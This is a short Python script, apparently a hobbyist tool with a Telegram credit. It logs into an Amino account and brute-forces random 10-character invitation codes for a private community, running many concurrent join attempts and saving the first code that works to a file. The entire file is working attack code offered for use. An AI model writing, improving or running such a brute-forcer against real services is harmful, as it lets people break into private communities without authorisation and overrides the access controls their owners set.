import asyncio
from random import choices
from sys import exit
from string import ascii_uppercase
from colorama import Fore
from pyfiglet import Figlet
from amino import AsyncClient
client = AsyncClient()
file = open("code.txt","a+")
codes = []

def gener_code():
	return "".join(choices(list(ascii_uppercase + "1234567890"), k=10))

async def account_login():
	try:
		await client.login(email=input("email: "),password=input("password: "))
	except Exception as e:
		print(e)
		await account_login()

async def get_com_link():
	global comId
	link = await client.get_from_code(input("community link: "))
	comId = link.json["extensions"]["community"]["ndcId"]

async def check_code():
	code = gener_code()
	if code not in codes:
		try:
			await client.join_community(comId=comId,invitationCode=code)
			file.write(f"{code}\n")
			print(f"{code} is correct")
			exit()
		except:
			print(f"{code} is wrong")
			codes.append(code)
			await check_code()

async def main():
	print(Fore.LIGHTCYAN_EX + Figlet(font="cricket").renderText("amino\ncode\nbruteforce")+"made by @xaquake\ntelegram: https://t.me/aminoxarl\n")
	await account_login()
	await get_com_link()
	while True:
		await asyncio.gather(*[asyncio.create_task(check_code()) for _ in range(int(input("count of tasks: ")))])

asyncio.get_event_loop().run_until_complete(main())
